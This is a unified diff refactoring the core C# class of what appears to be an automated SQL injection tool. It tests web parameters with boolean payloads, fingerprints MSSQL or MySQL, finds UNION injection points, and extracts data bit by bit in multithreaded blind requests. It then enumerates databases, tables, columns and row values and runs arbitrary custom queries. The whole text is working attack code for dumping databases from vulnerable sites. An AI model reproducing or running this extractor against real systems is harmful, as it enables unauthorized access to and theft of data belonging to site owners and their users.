@@ -1,586 +1,634 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Text;
-using System.Web;
 using System.Threading;
+using Sql_Database_Extraction;
+using ToolSet.DatabaseExtractorCode.DBExtractor;
 
-namespace Sql_Database_Extraction
+namespace ToolSet.DatabaseExtractorCode
 {
-    class DBExtractor
-    {
-        #region Properties
+   internal class DbExtractor
+   {
+      #region Properties
 
-        private bool encodeCharacter;
-        public bool EncodeCharacter
-        {
-            get { return encodeCharacter; }
-            set { encodeCharacter = value; }
-        }
+      private bool _encodeCharacter;
 
-        private bool encodeWhiteSpace;
-        public bool EncodeWhiteSpace
-        {
-            get { return encodeWhiteSpace; }
-            set { encodeWhiteSpace = value; }
-        }
+      private bool _encodeWhiteSpace;
+      private ExtractorInfos _extractingInfos;
+      private int _maxColumns;
 
-        private int minColumns;
-        public int MinColumns
-        {
-            get { return minColumns; }
-            set { if (value >= 1) minColumns = value; }
-        }
+      private int _minColumns;
+      private bool _userStop;
 
-        private int maxColumns;
-        public int MaxColumns
-        {
-            get { return maxColumns; }
-            set { if (value >= 1) maxColumns = value; }
-        }
+      public bool EncodeCharacter
+      {
+         get { return _encodeCharacter; }
+         set { _encodeCharacter = value; }
+      }
 
-        private ExtractorInfos extractingInfos;
-        public ExtractorInfos ExtractingInfos
-        {
-            get { return extractingInfos; }
-        }
+      public bool EncodeWhiteSpace
+      {
+         get { return _encodeWhiteSpace; }
+         set { _encodeWhiteSpace = value; }
+      }
 
-        private bool userStop;
-        public bool UserStop
-        {
-            get { return userStop; }
-            set { userStop = value; }
-        }
+      public int MinColumns
+      {
+         get { return _minColumns; }
+         set { if (value >= 1) _minColumns = value; }
+      }
 
-        #endregion
+      public int MaxColumns
+      {
+         get { return _maxColumns; }
+         set { if (value >= 1) _maxColumns = value; }
+      }
 
-        #region Private
+      public ExtractorInfos ExtractingInfos
+      {
+         get { return _extractingInfos; }
+      }
 
-        private InjectPatterns injectionPatterns;
-        private InternalData internalData;
-        private QueryConstructor queryConstructor;
-        private RequestConstructor requestConstructor;
-        private InjectionInfos injectInfos;
-        private List<Request> RequestList;
-        private string LastQueryOutput;
-        private RequestManager ReqManager;
-        private ManualResetEvent RequestsComplete;
-        private InjectingClass Injector;
+      public bool UserStop
+      {
+         get { return _userStop; }
+         set { _userStop = value; }
+      }
 
+      #endregion
 
-        #endregion
+      #region Private
 
-        public DBExtractor()
-        {
-            //Properties
-            encodeCharacter = false;
-            encodeWhiteSpace = false;
-            minColumns = 1;
-            maxColumns = 20;
-            extractingInfos = new ExtractorInfos();
+      private readonly InjectPatterns _injectionPatterns;
+      private readonly InternalData _internalData;
+      private readonly QueryConstructor.QueryConstructor _queryConstructor;
+      private InjectingClass _injector;
+      private string _lastQueryOutput;
+      private RequestManager _reqManager;
+      private List<Request> _requestList;
+      private ManualResetEvent _requestsComplete;
+      private InjectionInfos _injectInfos;
+      private RequestConstructor _requestConstructor;
 
-            // Private
-            injectionPatterns = new InjectPatterns();
-            internalData = new InternalData();
-            queryConstructor = new QueryConstructor();
-            injectInfos = new InjectionInfos();
-            RequestList = new List<Request>();
-            LastQueryOutput = string.Empty;
-            ReqManager = new RequestManager();
-            ReqManager.RequestFinished += new EventFinishedDelegate(ReqManager_RequestFinished);
-            RequestsComplete = new ManualResetEvent(false);
-            Injector = new InjectingClass();
-            userStop = false;
-        }
+      #endregion
 
-        public void UserStopMethod()
-        {
-            userStop = true;
-        }
-        public void UserStartMethod()
-        {
-            userStop = false;
-        }
+      public DbExtractor()
+      {
+         //Properties
+         _encodeCharacter = false;
+         _encodeWhiteSpace = false;
+         _minColumns = 1;
+         _maxColumns = 20;
+         _extractingInfos = new ExtractorInfos();
 
-        void ReqManager_RequestFinished(Request Req)
-        {
-            RequestList.Add(Req);
+         // Private
+         _injectionPatterns = new InjectPatterns();
+         _internalData = new InternalData();
+         _queryConstructor = new QueryConstructor.QueryConstructor();
+         _injectInfos = new InjectionInfos();
+         _requestList = new List<Request>();
+         _lastQueryOutput = string.Empty;
+         _reqManager = new RequestManager();
+         _reqManager.RequestFinished += ReqManagerRequestFinished;
+         _requestsComplete = new ManualResetEvent(false);
+         _injector = new InjectingClass();
+         _userStop = false;
+      }
 
-            ExtractingInfos.Requests.Add(Req.URL);
-            if (RequestList.Count == 8)
+      public void UserStopMethod()
+      {
+         _userStop = true;
+      }
+
+      public void UserStartMethod()
+      {
+         _userStop = false;
+      }
+
+      private void ReqManagerRequestFinished(Request req)
+      {
+         _requestList.Add(req);
+
+         ExtractingInfos.Requests.Add(req.URL);
+         if (_requestList.Count == 8)
+         {
+            string binaryString = string.Empty;
+            for (int i = 0; i < _requestList.Count; i++)
             {
-                string BinaryString = string.Empty;
-                for (int i = 0; i < RequestList.Count; i++)
-                {
-                    if (QuerySuccessfull(RequestList[i].HTML))
-                        BinaryString += "1";
-                    else
-                        BinaryString += "0";
-                }
-
-                if (!BinaryString.Contains("1") || userStop)
-                {
-                    ReqManager.Stop();
-                    RequestsComplete.Set();
-                    return;
-                }
-
-                LastQueryOutput += BinaryToString(BinaryString);
-                ExtractingInfos.CurrentQueryOutput = LastQueryOutput;
-
-                RequestList.Clear();
-                if (!userStop)
-                {
-                    BuildRequestsCharacter(Req.Function, Req.DataBaseType, (Req.naturalRequestNr + 1) / 8 + 1);
-
-                    if (ReqManager.Count() == 0)
-                    {
-                        ReqManager.Stop();
-                        RequestsComplete.Set();
-                        extractingInfos.Status.Add("Finished");
-                        extractingInfos.CurrentTestFinished = true;
-                    }
-                }
+               if (QuerySuccessfull(_requestList[i].HTML))
+                  binaryString += "1";
+               else
+                  binaryString += "0";
             }
-        }
 
-        public void Prepare(InjectionInfos _injectInfos)
-        {
-            userStop = false;
-            RequestList = new List<Request>();
-            extractingInfos = new ExtractorInfos();
-            LastQueryOutput = string.Empty;
-            Injector = new InjectingClass();
-            injectInfos = _injectInfos;
-            requestConstructor = new RequestConstructor(_injectInfos);
-            requestConstructor.EncodeCharacters = encodeCharacter;
-            requestConstructor.EncodeWhiteSpace = encodeWhiteSpace;
-            internalData.Prepared = true;
-            internalData.UseConditions = true;
-        }
-
-        public void TestParameterInjectable()
-        {
-            if (!internalData.Prepared)
-                return;
-            extractingInfos.Status.Add("Beginning tests if parameter is injectable");
-            extractingInfos.CurrentTestComplete = false;
-
-            internalData.ParameterInjectable = false;
-            extractingInfos.Status.Add("Sending requests");
-            foreach (string anfang in injectionPatterns.Begin)
+            if (!binaryString.Contains("1") || _userStop)
             {
-                if (internalData.ParameterInjectable)
-                    break;
+               _reqManager.Stop();
+               _requestsComplete.Set();
+               return;
+            }
 
-                foreach (string ende in injectionPatterns.End)
-                {
-                    if (internalData.ParameterInjectable)
+            _lastQueryOutput += BinaryToString(binaryString);
+            ExtractingInfos.CurrentQueryOutput = _lastQueryOutput;
+
+            _requestList.Clear();
+            if (!_userStop)
+            {
+               BuildRequestsCharacter(req.Function, req.DataBaseType, (req.NaturalRequestNr + 1) / 8 + 1);
+
+               if (_reqManager.Count() == 0)
+               {
+                  _reqManager.Stop();
+                  _requestsComplete.Set();
+                  _extractingInfos.Status.Add("Finished");
+                  _extractingInfos.CurrentTestFinished = true;
+               }
+            }
+         }
+      }
+
+      public void Prepare(InjectionInfos injectInfos)
+      {
+         _userStop = false;
+         _requestList = new List<Request>();
+         _extractingInfos = new ExtractorInfos();
+         _lastQueryOutput = string.Empty;
+         _injector = new InjectingClass();
+         _injectInfos = injectInfos;
+         _requestConstructor = new RequestConstructor(injectInfos)
+                                  {
+                                     EncodeCharacters = _encodeCharacter,
+                                     EncodeWhiteSpace = _encodeWhiteSpace
+                                  };
+         _internalData.Prepared = true;
+         _internalData.UseConditions = true;
+      }
+
+      public void TestParameterInjectable()
+      {
+         if (!_internalData.Prepared)
+            return;
+         _extractingInfos.Status.Add("Beginning tests if parameter is injectable");
+         _extractingInfos.CurrentTestComplete = false;
+
+         _internalData.ParameterInjectable = false;
+         _extractingInfos.Status.Add("Sending requests");
+         foreach (string anfang in _injectionPatterns.Begin)
+         {
+            if (_internalData.ParameterInjectable)
+               break;
+
+            foreach (string ende in _injectionPatterns.End)
+            {
+               if (_internalData.ParameterInjectable)
+                  break;
+
+               foreach (string condition in _injectionPatterns.Conditions)
+               {
+                  if (_userStop)
+                     return;
+                  string queryFailed = anfang + condition + "1=0" + ende;
+                  _requestConstructor.InsertQuery(queryFailed);
+                  string htmlFailed = SendWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST());
+
+                  string querySuccess = anfang + condition + "1=1" + ende;
+                  _requestConstructor.InsertQuery(querySuccess);
+                  string htmlSuccess = SendWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST());
+
+
+                  if (htmlSuccess.Contains(_injectInfos.Success) && !htmlFailed.Contains(_injectInfos.Success))
+                  {
+                     _internalData.InjectableBegin = anfang;
+                     _internalData.InjectableEnd = ende;
+                     _internalData.InjectableCondition = condition;
+                     _internalData.ParameterInjectable = true;
+                     break;
+                  }
+               }
+            }
+         }
+         ExtractingInfos.ParameterInjectable = _internalData.ParameterInjectable;
+         _injector.InjectBegin = _internalData.InjectableBegin;
+         _injector.InjectEnd = _internalData.InjectableEnd;
+         _injector.InjectCondition = _internalData.InjectableCondition;
+
+         if (_internalData.ParameterInjectable)
+         {
+            _extractingInfos.Status.Add("Parameter is injectable");
+            GetDatabaseType();
+
+            if (_internalData.ParameterInjectable)
+            {
+               List<string> unions =
+                  _injector.InjectUnionQueries(_queryConstructor.GetUnionQueries(_minColumns, _maxColumns,
+                                                                                 _internalData.DataBaseType));
+               for (int i = 0; i < unions.Count; i++)
+               {
+                  _requestConstructor.InsertQuery(unions[i]);
+                  string unionRequest = SendWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST());
+                  if (unionRequest.Contains("___ll12344321ll___"))
+                  {
+                     if (_internalData.DataBaseType == DataBaseType.Mssql)
+                     {
+                        int indexBegin = unions[i].IndexOf("CAST(");
+                        _injector.UnionQueryBegin = unions[i].Substring(0, indexBegin + 5) + "(";
+
+                        int indexEnd = unions[i].IndexOf(" as varchar)");
+                        _injector.UnionQueryEnd = ")" + unions[i].Substring(indexEnd);
+                     }
+                     else if (_internalData.DataBaseType == DataBaseType.MySql)
+                     {
+                        int indexBegin = unions[i].IndexOf("CONCAT(0x5f5f5f6c6c,");
+                        _injector.UnionQueryBegin = unions[i].Substring(0, indexBegin + "CONCAT(0x5f5f5f6c6c,".Length) +
+                                                    "(";
+
+                        int indexEnd = unions[i].IndexOf(",0x6c6c5f5f5f)");
+                        _injector.UnionQueryEnd = ")" + unions[i].Substring(indexEnd);
+                     }
+
+                     _internalData.UseConditions = false;
+                     break;
+                  }
+               }
+               GetDatabaseInfos();
+            }
+         }
+         else
+         {
+            _extractingInfos.Status.Add("Parameter is not injectable");
+            _extractingInfos.Status.Add("Finished");
+         }
+         _extractingInfos.CurrentTestComplete = true;
+      }
+
+      private void GetDatabaseType()
+      {
+         if (!_userStop)
+         {
+            _extractingInfos.Status.Add("Getting Database type");
+            BuildRequests("LTRIM(1)", DataBaseType.Mssql);
+            if (_lastQueryOutput == "1")
+            {
+               _internalData.DataBaseType = DataBaseType.Mssql;
+               _extractingInfos.Status.Add("Database type is MSSQL");
+               _extractingInfos.DatabaseType = "MSSQL";
+            }
+         }
+         if (!_userStop)
+         {
+            BuildRequests("CONCAT(0x31,0x31)", DataBaseType.MySql);
+            if (_lastQueryOutput == "11")
+            {
+               _internalData.DataBaseType = DataBaseType.MySql;
+               _extractingInfos.Status.Add("Database type is MySQL");
+               _extractingInfos.DatabaseType = "MySQL";
+            }
+         }
+         if (!_userStop)
+         {
+            if (_internalData.DataBaseType == DataBaseType.Unknown)
+            {
+               _internalData.ParameterInjectable = false;
+               _extractingInfos.Status.Add("Could not get Database type");
+               _extractingInfos.Status.Add("Finished");
+            }
+         }
+      }
+
+      public void GetDatabaseInfos()
+      {
+         if (!_internalData.ParameterInjectable || _userStop)
+            return;
+         _extractingInfos.CurrentTestComplete = false;
+         if (!_userStop)
+         {
+            _extractingInfos.Status.Add("Getting Version");
+            string version = BuildRequests(_queryConstructor.DbGetVersion(_internalData.DataBaseType),
+                                           _internalData.DataBaseType);
+            _extractingInfos.Version = version;
+         }
+         if (!_userStop)
+         {
+            _extractingInfos.Status.Add("Getting database name");
+            string currentDatabase = BuildRequests(_queryConstructor.DbGetDatabase(_internalData.DataBaseType),
+                                                   _internalData.DataBaseType);
+            _extractingInfos.CurrentDatabaseName = currentDatabase;
+         }
+         if (!_userStop)
+         {
+            _extractingInfos.Status.Add("Getting user");
+            string currentUser = BuildRequests(_queryConstructor.DbGetUser(_internalData.DataBaseType),
+                                               _internalData.DataBaseType);
+            _extractingInfos.User = currentUser;
+         }
+         _extractingInfos.CurrentTestComplete = true;
+         _extractingInfos.Status.Add("Pretests done");
+      }
+
+      private string BuildRequests(string function, DataBaseType db)
+      {
+         if (_internalData.UseConditions)
+         {
+            _extractingInfos.Status.Add("Start asynchron requests");
+            _requestList.Clear();
+            _lastQueryOutput = string.Empty;
+
+            _reqManager = new RequestManager
+                             {
+                                CustomCookieCollection = _injectInfos.CustomCookieCollection
+                             };
+            _reqManager.RequestFinished += ReqManagerRequestFinished;
+            _reqManager.StartThreads(4);
+            BuildRequestsCharacter(function, db, 1);
+
+            _requestsComplete = new ManualResetEvent(false);
+            var wh = new WaitHandle[] { _requestsComplete };
+            WaitHandle.WaitAny(wh, -1, false);
+            _extractingInfos.Status.Add("Asynchron requests complete");
+            return _lastQueryOutput;
+         }
+
+
+         _requestConstructor.InsertQuery(_injector.InjectUnionQuery(function));
+         string html = SendWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST());
+         int indexBegin = html.IndexOf("___ll");
+         if (indexBegin == -1)
+            return string.Empty;
+         html = html.Remove(0, indexBegin + 5);
+
+         int indexEnd = html.IndexOf("ll___");
+         if (indexEnd == -1)
+            return string.Empty;
+         html = html.Remove(indexEnd);
+
+         return html;
+
+      }
+
+
+      private void BuildRequestsCharacter(string function, DataBaseType db, int charPos)
+      {
+         {
+            List<string> queries = _injector.InjectConditionQueries(function, charPos, 0, 128, db);
+
+            for (int i = 0; i < queries.Count; i++)
+            {
+               if (_userStop)
+                  return;
+               string query = queries[i];
+               _requestConstructor.InsertQuery(query);
+               SendAsyncWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST(), function, db);
+            }
+         }
+      }
+
+      private static string BinaryToString(string binaryString)
+      {
+         if (binaryString.Length == 0)
+            return string.Empty;
+
+         string binaryStringReversed = string.Empty;
+         for (int i = (binaryString.Length - 1); i >= 0; i--)
+            binaryStringReversed += binaryString[i].ToString();
+
+         string text = Convert.ToChar(Convert.ToInt32(binaryStringReversed, 2)).ToString();
+         return text;
+      }
+
+      private bool QuerySuccessfull(string html)
+      {
+         if (html.Contains(_injectInfos.Success))
+            return true;
+
+         return false;
+      }
+
+      public void GetDatabases()
+      {
+         if (!_internalData.ParameterInjectable || _userStop)
+            return;
+
+         _extractingInfos.Status.Add("Getting databases");
+         _extractingInfos.CurrentTestComplete = false;
+         _extractingInfos.DatabaseInfos.Clear();
+
+         string databaseCount = BuildRequests(_queryConstructor.GetDatabaseCountQuery(_internalData.DataBaseType),
+                                              _internalData.DataBaseType);
+
+         int iDatabaseCount = Convert.ToInt32(databaseCount);
+         for (int i = 0; i < iDatabaseCount; i++)
+         {
+            string databaseName = BuildRequests(_queryConstructor.GetDatabaseNameQuery(_internalData.DataBaseType, i),
+                                                _internalData.DataBaseType);
+            _extractingInfos.DatabaseInfos.Add(new DatabaseInfo { DatabaseName = databaseName });
+         }
+         _extractingInfos.Status.Add("Done: Adding database");
+         _extractingInfos.CurrentTestComplete = true;
+      }
+
+      public void GetTables(object dbIndex)
+      {
+         GetTables((int)dbIndex);
+      }
+
+      private void GetTables(int dbIndex)
+      {
+         if (!_internalData.ParameterInjectable || _userStop)
+            return;
+         if (dbIndex > _extractingInfos.DatabaseInfos.Count || dbIndex < 0)
+            return;
+
+         _extractingInfos.Status.Add("Getting tables");
+         _extractingInfos.CurrentTestComplete = false;
+         _extractingInfos.DatabaseInfos[dbIndex].Tables.Clear();
+
+         string tabellenAnz = BuildRequests(
+            _queryConstructor.TabellenAnzahl(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName,
+                                             _internalData.DataBaseType), _internalData.DataBaseType);
+
+         int iTableCount = -1;
+
+         if (Int32.TryParse(tabellenAnz, out iTableCount))
+         {
+            for (int i = 0; i < iTableCount; i++)
+            {
+               string tabellenName = BuildRequests(
+                  _queryConstructor.GetTabellenNamenQuery(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName, i,
+                                                          _internalData.DataBaseType), _internalData.DataBaseType);
+
+               _extractingInfos.DatabaseInfos[dbIndex].Tables.Add(new Table { TableName = tabellenName });
+            }
+         }
+         _extractingInfos.Status.Add("Done: Adding tables");
+         _extractingInfos.CurrentTestComplete = true;
+      }
+
+      public void GetColumns(object parameter)
+      {
+         string[] split = parameter.ToString().Split(',');
+         GetColumns(Convert.ToInt32(split[0]), Convert.ToInt32(split[1]));
+      }
+
+      private void GetColumns(int dbIndex, int tableIndex)
+      {
+         if (!_internalData.ParameterInjectable || _userStop)
+            return;
+         if (dbIndex > _extractingInfos.DatabaseInfos.Count || dbIndex < 0)
+            return;
+
+         _extractingInfos.Status.Add("Getting columns");
+         _extractingInfos.CurrentTestComplete = false;
+         _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Clear();
+
+         string feldanzahl = BuildRequests(
+            _queryConstructor.GetFeldAnzahlQuery(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName,
+                                                 _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].TableName,
+                                                 _internalData.DataBaseType), _internalData.DataBaseType);
+
+         int iFeldanzahl = Convert.ToInt32(feldanzahl);
+         for (int i = 0; i < iFeldanzahl; i++)
+         {
+            string feldName =
+               BuildRequests(
+                  _queryConstructor.GetFeldNamenQuery(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName,
+                                                      _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].
+                                                         TableName,
+                                                      i, _internalData.DataBaseType), _internalData.DataBaseType);
+            string feldTyp =
+               BuildRequests(
+                  _queryConstructor.GetFeldTypQuery(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName,
+                                                    _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].TableName,
+                                                    feldName, _internalData.DataBaseType), _internalData.DataBaseType);
+
+            _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Add(new Field
+                                                                                     {
+                                                                                        FeldName = feldName,
+                                                                                        FeldTyp = feldTyp
+                                                                                     });
+         }
+         _extractingInfos.Status.Add("Done: Adding columns");
+         _extractingInfos.CurrentTestComplete = true;
+      }
+
+      public void GetRows(object parameter)
+      {
+         string[] split = parameter.ToString().Split(',');
+         GetRows(Convert.ToInt32(split[0]), Convert.ToInt32(split[1]));
+      }
+
+      private void GetRows(int dbIndex, int tableIndex)
+      {
+         if (!_internalData.ParameterInjectable || _userStop)
+            return;
+         if (dbIndex > _extractingInfos.DatabaseInfos.Count || dbIndex < 0)
+            return;
+
+         _extractingInfos.Status.Add("Getting rows");
+         _extractingInfos.CurrentTestComplete = false;
+
+         string databaseName = _extractingInfos.DatabaseInfos[dbIndex].DatabaseName;
+         string tabellenName = _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].TableName;
+
+         string Rows;
+         Rows = BuildRequests(
+            _queryConstructor.GetDatarowsCount(databaseName, tabellenName, _internalData.DataBaseType),
+            _internalData.DataBaseType);
+
+         int iRows = Convert.ToInt32(Rows);
+         string orderBySpalte = string.Empty;
+         for (int iRow = 0; iRow < 25 && iRow < iRows; iRow++)
+         {
+            for (int i = 0; i < _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Count; i++)
+            {
+               if (iRow == 0)
+                  _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[i].FeldWert.Clear();
+
+               string feldName = _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[i].FeldName;
+
+               //string FeldWertLänge = string.Empty;
+               //FeldWertLänge = BuildRequests(queryConstructor.GetDatarowsLength(DatabaseName, TabellenName, FeldName, iRow, internalData.DataBaseType), internalData.DataBaseType);
+               //int iFeldWertLänge = Convert.ToInt32(FeldWertLänge);
+               if (orderBySpalte.Length == 0)
+               {
+                  for (int iSpaltepk = 0;
+                       iSpaltepk < _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Count;
+                       iSpaltepk++)
+                  {
+                     string feldTypNeu =
+                        _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpaltepk].FeldTyp;
+                     string feldNameNeu =
+                        _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpaltepk].FeldName;
+                     if (feldTypNeu == "int")
+                        if (feldNameNeu.ToLower() == "id" || feldNameNeu.ToLower() == "pk" ||
+                            feldNameNeu.ToLower() == "nr" || feldNameNeu.ToLower() == "index")
+                        {
+                           orderBySpalte =
+                              _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpaltepk].FeldName;
+                           break;
+                        }
+                  }
+               }
+
+               if (orderBySpalte.Length == 0)
+               {
+                  for (int iSpalte = 0;
+                       iSpalte < _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Count;
+                       iSpalte++)
+                  {
+                     string feldTypNeu =
+                        _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpalte].FeldTyp;
+                     if (feldTypNeu != "text" && feldTypNeu != "ntext" && feldTypNeu != "image")
+                     {
+                        orderBySpalte =
+                           _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpalte].FeldName;
                         break;
-
-                    foreach (string condition in injectionPatterns.Conditions)
-                    {
-                        if (userStop)
-                            return;
-                        string queryFailed = anfang + condition + "1=0" + ende;
-                        requestConstructor.InsertQuery(queryFailed);
-                        string HTMLFailed = SendWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST());
-
-                        string querySuccess = anfang + condition + "1=1" + ende;
-                        requestConstructor.InsertQuery(querySuccess);
-                        string HTMLSuccess = SendWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST());
+                     }
+                  }
+               }
 
 
-                        if (HTMLSuccess.Contains(injectInfos.Success) && !HTMLFailed.Contains(injectInfos.Success))
-                        {
-                            internalData.InjectableBegin = anfang;
-                            internalData.InjectableEnd = ende;
-                            internalData.InjectableCondition = condition;
-                            internalData.ParameterInjectable = true;
-                            break;
-                        }
-                    }
-                }
+               string feldWert =
+                  BuildRequests(
+                     _queryConstructor.GetDatarowValue(databaseName, tabellenName, feldName, iRow, orderBySpalte,
+                                                       _internalData.DataBaseType), _internalData.DataBaseType);
+               _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[i].FeldWert.Add(feldWert);
             }
-            ExtractingInfos.ParameterInjectable = internalData.ParameterInjectable;
-            Injector.InjectBegin = internalData.InjectableBegin;
-            Injector.InjectEnd = internalData.InjectableEnd;
-            Injector.InjectCondition = internalData.InjectableCondition;
+         }
 
-            if (internalData.ParameterInjectable)
-            {
-                extractingInfos.Status.Add("Parameter is injectable");
-                GetDatabaseType();
+         _extractingInfos.Status.Add("Done: Adding rows");
+         _extractingInfos.CurrentTestComplete = true;
+      }
 
-                if (internalData.ParameterInjectable)
-                {
-                    List<string> Unions = Injector.InjectUnionQueries(queryConstructor.getUnionQueries(minColumns, maxColumns, internalData.DataBaseType));
-                    for (int i = 0; i < Unions.Count; i++)
-                    {
-                        requestConstructor.InsertQuery(Unions[i]);
-                        string UnionRequest = SendWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST());
-                        if (UnionRequest.Contains("___ll12344321ll___"))
-                        {
-                            if (internalData.DataBaseType == eDataBase.MSSQL)
-                            {
-                                int IndexBegin = Unions[i].IndexOf("CAST(");
-                                Injector.UnionQueryBegin = Unions[i].Substring(0, IndexBegin + 5) + "(";
+      public string ExecuteCustomQuery(string query)
+      {
+         if (_internalData.ParameterInjectable)
+         {
+            string output = BuildRequests(query, _internalData.DataBaseType);
+            if (output == string.Empty)
+               return "query failed or nothing to display";
 
-                                int IndexEnd = Unions[i].IndexOf(" as varchar)");
-                                Injector.UnionQueryEnd = ")" + Unions[i].Substring(IndexEnd);
-                            }
-                            else if (internalData.DataBaseType == eDataBase.MySQL)
-                            {
-                                int IndexBegin = Unions[i].IndexOf("CONCAT(0x5f5f5f6c6c,");
-                                Injector.UnionQueryBegin = Unions[i].Substring(0, IndexBegin + "CONCAT(0x5f5f5f6c6c,".Length) + "(";
-
-                                int IndexEnd = Unions[i].IndexOf(",0x6c6c5f5f5f)");
-                                Injector.UnionQueryEnd = ")" + Unions[i].Substring(IndexEnd);
-                            }
-
-                            internalData.UseConditions = false;
-                            break;
-                        }
-                    }
-                    GetDatabaseInfos();
-                }
-            }
-            else
-            {
-                extractingInfos.Status.Add("Parameter is not injectable");
-                extractingInfos.Status.Add("Finished");
-            }
-            extractingInfos.CurrentTestComplete = true;
-        }
-
-        private void GetDatabaseType()
-        {
-            if (!userStop)
-            {
-                extractingInfos.Status.Add("Getting Database type");
-                BuildRequests("LTRIM(1)", eDataBase.MSSQL);
-                if (LastQueryOutput == "1")
-                {
-                    internalData.DataBaseType = eDataBase.MSSQL;
-                    extractingInfos.Status.Add("Database type is MSSQL");
-                    extractingInfos.DatabaseType = "MSSQL";
-                }
-            }
-            if (!userStop)
-            {
-                BuildRequests("CONCAT(0x31,0x31)", eDataBase.MySQL);
-                if (LastQueryOutput == "11")
-                {
-                    internalData.DataBaseType = eDataBase.MySQL;
-                    extractingInfos.Status.Add("Database type is MySQL");
-                    extractingInfos.DatabaseType = "MySQL";
-
-                }
-            }
-            if (!userStop)
-            {
-                if (internalData.DataBaseType == eDataBase.unknown)
-                {
-                    internalData.ParameterInjectable = false;
-                    extractingInfos.Status.Add("Could not get Database type");
-                    extractingInfos.Status.Add("Finished");
-                }
-            }
-        }
-
-        public void GetDatabaseInfos()
-        {
-            if (!internalData.ParameterInjectable || userStop)
-                return;
-            extractingInfos.CurrentTestComplete = false;
-            if (!userStop)
-            {
-                extractingInfos.Status.Add("Getting Version");
-                string Version = string.Empty;
-                Version = BuildRequests(queryConstructor.DBGetVersion(internalData.DataBaseType), internalData.DataBaseType);
-                extractingInfos.Version = Version;
-            }
-            if (!userStop)
-            {
-                extractingInfos.Status.Add("Getting database name");
-                string CurrentDatabase = string.Empty;
-                CurrentDatabase = BuildRequests(queryConstructor.DBGetDatabase(internalData.DataBaseType), internalData.DataBaseType);
-                extractingInfos.CurrentDatabaseName = CurrentDatabase;
-            }
-            if (!userStop)
-            {
-                extractingInfos.Status.Add("Getting user");
-                string CurrentUser = string.Empty;
-                CurrentUser = BuildRequests(queryConstructor.DBGetUser(internalData.DataBaseType), internalData.DataBaseType);
-                extractingInfos.User = CurrentUser;
-            }
-            extractingInfos.CurrentTestComplete = true;
-            extractingInfos.Status.Add("Pretests done");
-        }
-
-        private string BuildRequests(string Function, eDataBase DB)
-        {
-            if (internalData.UseConditions)
-            {
-                extractingInfos.Status.Add("Start asynchron requests");
-                RequestList.Clear();
-                LastQueryOutput = string.Empty;
-
-                ReqManager = new RequestManager();
-                ReqManager.CustomCookieCollection = injectInfos.CustomCookieCollection;
-                ReqManager.RequestFinished += new EventFinishedDelegate(ReqManager_RequestFinished);
-                ReqManager.StartThreads(4);
-                BuildRequestsCharacter(Function, DB, 1);
-
-                RequestsComplete = new ManualResetEvent(false);
-                WaitHandle[] WH = new WaitHandle[] { RequestsComplete };
-                WaitHandle.WaitAny(WH, -1, false);
-                extractingInfos.Status.Add("Asynchron requests complete");
-                return LastQueryOutput;
-            }
-
-            else
-            {
-                requestConstructor.InsertQuery(Injector.InjectUnionQuery(Function));
-                string HTML = SendWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST());
-                int indexBegin = HTML.IndexOf("___ll");
-                if (indexBegin == -1)
-                    return string.Empty;
-                HTML = HTML.Remove(0, indexBegin + 5);
-
-                int indexEnd = HTML.IndexOf("ll___");
-                if (indexEnd == -1)
-                    return string.Empty;
-                HTML = HTML.Remove(indexEnd);
-
-                return HTML;
-            }
-        }
+            return output;
+         }
+         return "Parameter is not injectable";
+      }
 
 
-        private void BuildRequestsCharacter(string Function, eDataBase DB, int CharPos)
-        {
-            {
-                List<string> Queries = new List<string>();
-                Queries = Injector.InjectConditionQueries(Function, CharPos, 0, 128, DB);
+      private string SendWebrequest(string url, string post)
+      {
+         var request = new CreateWebrequest
+                          {
+                             CustomCookieCollection = _injectInfos.CustomCookieCollection
+                          };
 
-                for (int i = 0; i < Queries.Count; i++)
-                {
-                    if (userStop)
-                        return;
-                    string Query = Queries[i];
-                    requestConstructor.InsertQuery(Query);
-                    SendAsyncWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST(), Function, DB);
-                }
-            }
-        }
+         string html = request.StringGetWebPage(url, post);
+         ExtractingInfos.Requests.Add(url);
 
-        private string BinaryToString(string BinaryString)
-        {
-            if (BinaryString.Length == 0)
-                return string.Empty;
+         return html;
+      }
 
-            string BinaryStringReversed = string.Empty;
-            for (int i = (BinaryString.Length - 1); i >= 0; i--)
-                BinaryStringReversed += BinaryString[i].ToString();
-
-            string Text = Convert.ToChar(Convert.ToInt32(BinaryStringReversed, 2)).ToString();
-            return Text;
-        }
-
-        private bool QuerySuccessfull(string HTML)
-        {
-            if (HTML.Contains(injectInfos.Success))
-                return true;
-
-            return false;
-        }
-
-        public void GetDatabases()
-        {
